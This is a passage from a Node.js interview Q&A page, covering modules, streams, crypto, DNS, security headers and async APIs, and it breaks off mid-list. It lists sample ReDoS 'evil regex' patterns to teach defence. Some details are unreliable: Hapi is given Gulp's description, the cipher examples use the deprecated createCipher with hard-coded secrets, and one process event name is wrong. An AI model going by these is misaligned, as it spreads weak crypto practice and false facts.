   &lt;li&gt;Visual Studio Code&lt;/li&gt; 
   &lt;li&gt;Cloud9&lt;/li&gt; 
   &lt;li&gt;Brackets&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Profiling&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;1. node --prof ./app.js
2. node --prof-process ./the-generated-log-file
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Heapdumps&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;node-heapdump with Chrome Developer Tools&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Tracing&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Interactive Stack Traces with TraceGL&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Logging&lt;/strong&gt;&lt;br&gt; Libraries that output debugging information&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Caterpillar&lt;/li&gt; 
   &lt;li&gt;Tracer&lt;/li&gt; 
   &lt;li&gt;scribbles&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Libraries that enhance stack trace information&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Longjohn&lt;/li&gt; 
&lt;/ul&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What are some of the most popular modules of Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Async&lt;/strong&gt;: Async is a utility module which provides straight-forward, powerful functions for working with asynchronous JavaScript.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Browserify&lt;/strong&gt;: Browserify will recursively analyze all the require() calls in your app in order to build a bundle you can serve up to the browser in a single 
  &lt;!-- raw HTML omitted --&gt; tag.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Bower&lt;/strong&gt;: Bower is a package manager for the web. It works by fetching and installing packages from all over, taking care of hunting, finding, downloading, and saving the stuff you‚Äôre looking for.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Backbone&lt;/strong&gt;: Backbone.js gives structure to web applications by providing models with key-value binding and custom events, collections with a rich API of enumerable functions, views with declarative event handling, and connects it all to your existing API over a RESTful JSON interface.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Csv&lt;/strong&gt;: csv module has four sub modules which provides CSV generation, parsing, transformation and serialization for Node.js.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Debug&lt;/strong&gt;: Debug is a tiny node.js debugging utility modelled after node core&#39;s debugging technique.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Express&lt;/strong&gt;: Express is a fast, un-opinionated, minimalist web framework. It provides small, robust tooling for HTTP servers, making it a great solution for single page applications, web sites, hybrids, or public HTTP APIs.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Forever&lt;/strong&gt;: A simple CLI tool for ensuring that a given node script runs continuously (i.e. forever).&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Grunt&lt;/strong&gt;: is a JavaScript Task Runner that facilitates creating new projects and makes performing repetitive but necessary tasks such as linting, unit testing, concatenating and minifying files (among other things) trivial.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Gulp&lt;/strong&gt;: is a streaming build system that helps you automate painful or time-consuming tasks in your development workflow.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Hapi&lt;/strong&gt;: is a streaming build system that helps you automate painful or time-consuming tasks in your development workflow.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Http-server&lt;/strong&gt;: is a simple, zero-configuration command-line http server. It is powerful enough for production usage, but it&#39;s simple and hackable enough to be used for testing, local development, and learning.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Inquirer&lt;/strong&gt;: A collection of common interactive command line user interfaces.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Jquery&lt;/strong&gt;: jQuery is a fast, small, and feature-rich JavaScript library.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Jshint&lt;/strong&gt;: Static analysis tool to detect errors and potential problems in JavaScript code and to enforce your team&#39;s coding conventions.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Koa&lt;/strong&gt;: Koa is web app framework. It is an expressive HTTP middleware for node.js to make web applications and APIs more enjoyable to write.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Lodash&lt;/strong&gt;: The lodash library exported as a node module. Lodash is a modern JavaScript utility library delivering modularity, performance, &amp;amp; extras.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Less&lt;/strong&gt;: The less library exported as a node module.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Moment&lt;/strong&gt;: A lightweight JavaScript date library for parsing, validating, manipulating, and formatting dates.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Mongoose&lt;/strong&gt;: It is a MongoDB object modeling tool designed to work in an asynchronous environment.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;MongoDB&lt;/strong&gt;: The official MongoDB driver for Node.js. It provides a high-level API on top of mongodb-core that is meant for end users.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Npm&lt;/strong&gt;: is package manager for javascript.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Nodemon&lt;/strong&gt;: It is a simple monitor script for use during development of a node.js app, It will watch the files in the directory in which nodemon was started, and if any files change, nodemon will automatically restart your node application.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Nodemailer&lt;/strong&gt;: This module enables e-mail sending from a Node.js applications.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Optimist&lt;/strong&gt;: is a node.js library for option parsing with an argv hash.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Phantomjs&lt;/strong&gt;: An NPM installer for PhantomJS, headless webkit with JS API. It has fast and native support for various web standards: DOM handling, CSS selector, JSON, Canvas, and SVG.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Passport&lt;/strong&gt;: A simple, unobtrusive authentication middleware for Node.js. Passport uses the strategies to authenticate requests. Strategies can range from verifying username and password credentials or authentication using OAuth or OpenID.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Q&lt;/strong&gt;: Q is a library for promises. A promise is an object that represents the return value or the thrown exception that the function may eventually provide.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Request&lt;/strong&gt;: Request is Simplified HTTP request client make it possible to make http calls. It supports HTTPS and follows redirects by default.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Socket.io&lt;/strong&gt;: Its a node.js realtime framework server.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Sails&lt;/strong&gt;: Sails : API-driven framework for building realtime apps, using MVC conventions (based on Express and Socket.io)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Through&lt;/strong&gt;: It enables simplified stream construction. It is easy way to create a stream that is both readable and writable.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Underscore&lt;/strong&gt;: Underscore.js is a utility-belt library for JavaScript that provides support for the usual functional suspects (each, map, reduce, filter...) without extending any core JavaScript objects.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Validator&lt;/strong&gt;: A nodejs module for a library of string validators and sanitizers.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Winston&lt;/strong&gt;: A multi-transport async logging library for Node.js&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Ws&lt;/strong&gt;: A simple to use, blazing fast and thoroughly tested websocket client, server and console for node.js&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Xml2js&lt;/strong&gt;: A Simple XML to JavaScript object converter.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Yo&lt;/strong&gt;: A CLI tool for running Yeoman generators&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Zmq&lt;/strong&gt;: Bindings for node.js and io.js to ZeroMQ .It is a high-performance asynchronous messaging library, aimed at use in distributed or concurrent applications.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is EventEmitter in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;All objects that emit events are members of EventEmitter class. These objects expose an &lt;code&gt;eventEmitter.on()&lt;/code&gt; function that allows one or more functions to be attached to named events emitted by the object.&lt;/p&gt; 
&lt;p&gt;When the EventEmitter object emits an event, all of the functions attached to that specific event are called synchronously. All values returned by the called listeners are ignored and will be discarded.&lt;/p&gt; 
&lt;p&gt;&lt;em&gt;Example&lt;/em&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;var events = require(&#39;events&#39;);
var eventEmitter = new events.EventEmitter();

// listener #1
var listner1 = function listner1() {
   console.log(&#39;listner1 executed.&#39;);
}

// listener #2
var listner2 = function listner2() {
   console.log(&#39;listner2 executed.&#39;);
}

// Bind the connection event with the listner1 function
eventEmitter.addListener(&#39;connection&#39;, listner1);

// Bind the connection event with the listner2 function
eventEmitter.on(&#39;connection&#39;, listner2);

var eventListeners = require(&#39;events&#39;).EventEmitter.listenerCount
   (eventEmitter,&#39;connection&#39;);
console.log(eventListeners + &quot; Listner(s) listening to connection event&quot;);

// Fire the connection event 
eventEmitter.emit(&#39;connection&#39;);

// Remove the binding of listner1 function
eventEmitter.removeListener(&#39;connection&#39;, listner1);
console.log(&quot;Listner1 will not listen now.&quot;);

// Fire the connection event 
eventEmitter.emit(&#39;connection&#39;);

eventListeners = require(&#39;events&#39;).EventEmitter.listenerCount(eventEmitter,&#39;connection&#39;);
console.log(eventListeners + &quot; Listner(s) listening to connection event&quot;);

console.log(&quot;Program Ended.&quot;);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Now run the main.js&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ node main.js
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Output&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;2 Listner(s) listening to connection event
listner1 executed.
listner2 executed.
Listner1 will not listen now.
listner2 executed.
1 Listner(s) listening to connection event
Program Ended.
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;How many types of streams are present in node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;Streams are objects that let you read data from a source or write data to a destination in continuous fashion. There are four types of streams&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Readable&lt;/strong&gt; ‚àí Stream which is used for read operation.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Writable&lt;/strong&gt; ‚àí Stream which is used for write operation.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Duplex&lt;/strong&gt; ‚àí Stream which can be used for both read and write operation.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Transform&lt;/strong&gt; ‚àí A type of duplex stream where the output is computed based on input.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Each type of Stream is an EventEmitter instance and throws several events at different instance of times.&lt;/p&gt; 
&lt;p&gt;&lt;em&gt;Example&lt;/em&gt;:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;data&lt;/strong&gt; ‚àí This event is fired when there is data is available to read.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;end&lt;/strong&gt; ‚àí This event is fired when there is no more data to read.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;error&lt;/strong&gt; ‚àí This event is fired when there is any error receiving or writing data.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;finish&lt;/strong&gt; ‚àí This event is fired when all the data has been flushed to underlying system.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Reading from a Stream&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;var fs = require(&quot;fs&quot;);
var data = &#39;&#39;;

// Create a readable stream
var readerStream = fs.createReadStream(&#39;input.txt&#39;);

// Set the encoding to be utf8. 
readerStream.setEncoding(&#39;UTF8&#39;);

// Handle stream events --&amp;gt; data, end, and error
readerStream.on(&#39;data&#39;, function(chunk) {
   data += chunk;
});

readerStream.on(&#39;end&#39;,function() {
   console.log(data);
});

readerStream.on(&#39;error&#39;, function(err) {
   console.log(err.stack);
});

console.log(&quot;Program Ended&quot;);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Writing to a Stream&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;var fs = require(&quot;fs&quot;);
var data = &#39;Simply Easy Learning&#39;;

// Create a writable stream
var writerStream = fs.createWriteStream(&#39;output.txt&#39;);

// Write the data to stream with encoding to be utf8
writerStream.write(data,&#39;UTF8&#39;);

// Mark the end of file
writerStream.end();

// Handle stream events --&amp;gt; finish, and error
writerStream.on(&#39;finish&#39;, function() {
   console.log(&quot;Write completed.&quot;);
});

writerStream.on(&#39;error&#39;, function(err) {
   console.log(err.stack);
});

console.log(&quot;Program Ended&quot;);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Piping the Streams&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Piping is a mechanism where we provide the output of one stream as the input to another stream. It is normally used to get data from one stream and to pass the output of that stream to another stream. There is no limit on piping operations.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;var fs = require(&quot;fs&quot;);

// Create a readable stream
var readerStream = fs.createReadStream(&#39;input.txt&#39;);

// Create a writable stream
var writerStream = fs.createWriteStream(&#39;output.txt&#39;);

// Pipe the read and write operations
// read input.txt and write data to output.txt
readerStream.pipe(writerStream);

console.log(&quot;Program Ended&quot;);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Chaining the Streams&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Chaining is a mechanism to connect the output of one stream to another stream and create a chain of multiple stream operations. It is normally used with piping operations.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;var fs = require(&quot;fs&quot;);
var zlib = require(&#39;zlib&#39;);

// Compress the file input.txt to input.txt.gz
fs.createReadStream(&#39;input.txt&#39;)
   .pipe(zlib.createGzip())
   .pipe(fs.createWriteStream(&#39;input.txt.gz&#39;));
  
console.log(&quot;File Compressed.&quot;);
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is crypto in Node.js? How do you cipher the secure information in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;The Node.js Crypto module supports cryptography. It provides cryptographic functionality that includes a set of wrappers for open SSL&#39;s hash HMAC, cipher, decipher, sign and verify functions.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Hash&lt;/strong&gt;: A hash is a fixed-length string of bits i.e. procedurally and deterministically generated from some arbitrary block of source data.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;HMAC&lt;/strong&gt;: HMAC stands for Hash-based Message Authentication Code. It is a process for applying a hash algorithm to both data and a secret key that results in a single final hash.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Encryption Example using Hash and HMAC&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const crypto = require(&#39;crypto&#39;);  
const secret = &#39;abcdefg&#39;;  
const hash = crypto.createHmac(&#39;sha256&#39;, secret)  
                   .update(&#39;Welcome to JavaTpoint&#39;)  
                   .digest(&#39;hex&#39;);  
console.log(hash);  
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt;Encryption example using Cipher&lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const crypto = require(&#39;crypto&#39;);  
const cipher = crypto.createCipher(&#39;aes192&#39;, &#39;a password&#39;);  
var encrypted = cipher.update(&#39;Hello JavaTpoint&#39;, &#39;utf8&#39;, &#39;hex&#39;);  
encrypted += cipher.final(&#39;hex&#39;);  
console.log(encrypted);
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt;Decryption example using Decipher&lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const crypto = require(&#39;crypto&#39;);  
const decipher = crypto.createDecipher(&#39;aes192&#39;, &#39;a password&#39;);  
var encrypted = &#39;4ce3b761d58398aed30d5af898a0656a3174d9c7d7502e781e83cf6b9fb836d5&#39;;  
var decrypted = decipher.update(encrypted, &#39;hex&#39;, &#39;utf8&#39;);  
decrypted += decipher.final(&#39;utf8&#39;);  
console.log(decrypted);  
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is the use of DNS module in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;DNS is a node module used to do name resolution facility which is provided by the operating system as well as used to do an actual DNS lookup. No need for memorising IP addresses ‚Äì DNS servers provide a nifty solution of converting domain or subdomain names to IP addresses. This module provides an asynchronous network wrapper and can be imported using the following syntax.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const dns = require(&#39;dns&#39;);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;em&gt;Example&lt;/em&gt;: &lt;code&gt;dns.lookup()&lt;/code&gt; function&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const dns = require(&#39;dns&#39;);  
dns.lookup(&#39;www.google.com&#39;, (err, addresses, family) =&amp;gt; {  
  console.log(&#39;addresses:&#39;, addresses);  
  console.log(&#39;family:&#39;,family);  
});  
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;em&gt;Example&lt;/em&gt;: &lt;code&gt;resolve4()&lt;/code&gt; and &lt;code&gt;reverse()&lt;/code&gt; functions&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const dns = require(&#39;dns&#39;);  
dns.resolve4(&#39;www.google.com&#39;, (err, addresses) =&amp;gt; {  
  if (err) throw err;  
  console.log(`addresses: ${JSON.stringify(addresses)}`);  
  addresses.forEach((a) =&amp;gt; {  
    dns.reverse(a, (err, hostnames) =&amp;gt; {  
      if (err) {  
        throw err;  
      }  
      console.log(`reverse for ${a}: ${JSON.stringify(hostnames)}`);  
    });  
  });  
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;em&gt;Example&lt;/em&gt;: print the localhost name using &lt;code&gt;lookupService()&lt;/code&gt; function&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const dns = require(&#39;dns&#39;);  
dns.lookupService(&#39;127.0.0.1&#39;, 22, (err, hostname, service) =&amp;gt; {  
  console.log(hostname, service);  
    // Prints: localhost  
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What are the security mechanisms available in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;Using the Helmet module&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Helmet helps to secure your Express applications by setting various HTTP headers, like:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;X-Frame-Options to mitigates clickjacking attacks,&lt;/li&gt; 
 &lt;li&gt;Strict-Transport-Security to keep your users on HTTPS,&lt;/li&gt; 
 &lt;li&gt;X-XSS-Protection to prevent reflected XSS attacks,&lt;/li&gt; 
 &lt;li&gt;X-DNS-Prefetch-Control to disable browsers DNS prefetching.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const express = require(&#39;express&#39;)
const helmet = require(&#39;helmet&#39;)
const app = express()

app.use(helmet())
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Validating user input&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Validating user input is one of the most important things to do when it comes to the security of your application. Failing to do it correctly can open up your application and users to a wide range of attacks, including command injection, SQL injection or stored cross-site scripting.&lt;/p&gt; 
&lt;p&gt;To validate user input, one of the best libraries you can pick is joi. Joi is an object schema description language and validator for JavaScript objects.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const Joi = require(&#39;joi&#39;);

const schema = Joi.object().keys({
    username: Joi.string().alphanum().min(3).max(30).required(),
    password: Joi.string().regex(/^[a-zA-Z0-9]{3,30}$/),
    access_token: [Joi.string(), Joi.number()],
    birthyear: Joi.number().integer().min(1900).max(2013),
    email: Joi.string().email()
}).with(&#39;username&#39;, &#39;birthyear&#39;).without(&#39;password&#39;, &#39;access_token&#39;)

// Return result
const result = Joi.validate({
    username: &#39;abc&#39;,
    birthyear: 1994
}, schema)
// result.error === null -&amp;gt; valid
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Securing your Regular Expressions&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Regular Expressions are a great way to manipulate texts and get the parts that you need from them. However, there is an attack vector called Regular Expression Denial of Service attack, which exposes the fact that most Regular Expression implementations may reach extreme situations for specially crafted input, that cause them to work extremely slowly.&lt;/p&gt; 
&lt;p&gt;The Regular Expressions that can do such a thing are commonly referred as Evil Regexes. These expressions contain: *grouping with repetition, *inside the repeated group: *repetition, or *alternation with overlapping&lt;/p&gt; 
&lt;p&gt;Examples of Evil Regular Expressions patterns:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;(a+)+
([a-zA-Z]+)*
(a|aa)+
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Security.txt&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Security.txt defines a standard to help organizations define the process for security researchers to securely disclose security vulnerabilities.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const express = require(&#39;express&#39;)
const securityTxt = require(&#39;express-security.txt&#39;)

const app = express()

app.get(&#39;/security.txt&#39;, securityTxt({
  // your security address
  contact: &#39;email@example.com&#39;,
  // your pgp key
  encryption: &#39;encryption&#39;,
  // if you have a hall of fame for securty resourcers, include the link here
  acknowledgements: &#39;http://acknowledgements.example.com&#39;
}))
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;Name the types of API functions in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;There are two types of API functions in Node.js:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Asynchronous, Non-blocking functions&lt;/li&gt; 
 &lt;li&gt;Synchronous, Blocking functions&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;1. Blocking functions&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;In a blocking operation, all other code is blocked from executing until an I/O event that is being waited on occurs. Blocking functions execute synchronously.&lt;/p&gt; 
&lt;p&gt;&lt;em&gt;Example&lt;/em&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const fs = require(&#39;fs&#39;);
const data = fs.readFileSync(&#39;/file.md&#39;); // blocks here until file is read
console.log(data);
// moreWork(); will run after console.log
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The second line of code blocks the execution of additional JavaScript until the entire file is read. moreWork () will only be called after Console.log&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;2. Non-blocking functions&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;In a non-blocking operation, multiple I/O calls can be performed without the execution of the program being halted. Non-blocking functions execute asynchronously.&lt;/p&gt; 
&lt;p&gt;&lt;em&gt;Example&lt;/em&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const fs = require(&#39;fs&#39;);
fs.readFile(&#39;/file.md&#39;, (err, data) =&amp;gt; {
  if (err) throw err;
  console.log(data);
});
// moreWork(); will run before console.log
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Since &lt;code&gt;fs.readFile()&lt;/code&gt; is non-blocking, moreWork() does not have to wait for the file read to complete before being called. This allows for higher throughput.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;How does Node.js handle child threads?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;Node.js is a single threaded language which in background uses multiple threads to execute asynchronous code. Node.js is non-blocking which means that all functions ( callbacks ) are delegated to the event loop and they are ( or can be ) executed by different threads. That is handled by Node.js run-time.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Nodejs Primary application runs in an event loop, which is in a single thread.&lt;/li&gt; 
 &lt;li&gt;Background I/O is running in a thread pool that is only accessible to C/C++ or other compiled/native modules and mostly transparent to the JS.&lt;/li&gt; 
 &lt;li&gt;Node v11/12 now has experimental worker_threads, which is another option.&lt;/li&gt; 
 &lt;li&gt;Node.js does support forking multiple processes ( which are executed on different cores ).&lt;/li&gt; 
 &lt;li&gt;It is important to know that state is not shared between master and forked process.&lt;/li&gt; 
 &lt;li&gt;We can pass messages to forked process ( which is different script ) and to master process from forked process with function send.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is the preferred method of resolving unhandled exceptions in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;Unhandled exceptions in Node.js can be caught at the Process level by attaching a handler for uncaughtException event.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;process.on(&#39;uncaughtException&#39;, function(err) {
    console.log(&#39;Caught exception: &#39; + err);
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Process is a global object that provides information about the current Node.js process. Process is a listener function that is always listening to events.&lt;/p&gt; 
&lt;p&gt;Few events are :&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Exit&lt;/li&gt; 
 &lt;li&gt;disconnect&lt;/li&gt; 
 &lt;li&gt;unhandledException&lt;/li&gt; 
 &lt;li&gt;rejectionHandled&lt;/li&gt; 
&lt;/ol&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;How does Node.js support multi-processor platforms, and does it fully utilize all processor resources?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;Since Node.js is by default a single thread application, it will run on a single processor core and will not take full advantage of multiple core resources. However, Node.js provides support for deployment on multiple-core systems, to take greater advantage of the hardware. The Cluster module is one of the core Node.js modules and it allows running multiple Node.js worker processes that will share the same port.&lt;/p&gt; 
&lt;p&gt;The cluster module helps to spawn new processes on the operating system. Each process works independently, so you cannot use shared state between child processes. Each process communicates with the main process by IPC and pass server handles back and forth.&lt;/p&gt; 
&lt;p&gt;Cluster supports two types of load distribution:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;The main process listens on a port, accepts new connection and assigns it to a child process in a round robin fashion.&lt;/li&gt; 
 &lt;li&gt;The main process assigns the port to a child process and child process itself listen the port.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is typically the first argument passed to a Node.js callback handler?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;The first argument to any callback handler is an optional error object&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;function callback(err, results) {
    // usually we&#39;ll check for the error before handling results
    if(err) {
        // handle error somehow and return
    }
    // no error, perform standard callback handling
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;How Node.js read the content of a file?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;The &quot;normal&quot; way in Node.js is probably to read in the content of a file in a non-blocking, asynchronous way. That is, to tell Node to read in the file, and then to get a callback when the file-reading has been finished. That would allow us to hand several requests in parallel.&lt;/p&gt; 
&lt;p&gt;Common use for the File System module:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Read files&lt;/li&gt; 
 &lt;li&gt;Create files&lt;/li&gt; 
 &lt;li&gt;Update files&lt;/li&gt; 
